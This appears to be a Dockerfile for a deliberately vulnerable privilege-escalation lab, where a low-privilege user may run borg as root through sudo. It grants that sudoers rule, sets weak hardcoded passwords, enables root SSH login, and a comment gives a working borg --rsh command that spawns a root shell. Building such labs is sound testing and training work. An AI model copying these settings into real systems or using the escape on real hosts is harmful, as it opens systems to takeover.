FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_borg
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/borg as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and borgbackup
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        borgbackup \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify borg is installed
RUN which borg && ls -la /usr/bin/borg

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# borg can be abused via its --rsh option to execute arbitrary commands.
# The exploit approach:
#   sudo borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
# This causes borg to invoke a shell as root through the remote shell command.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/borg" > /etc/sudoers.d/borg && \
    chmod 440 /etc/sudoers.d/borg

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]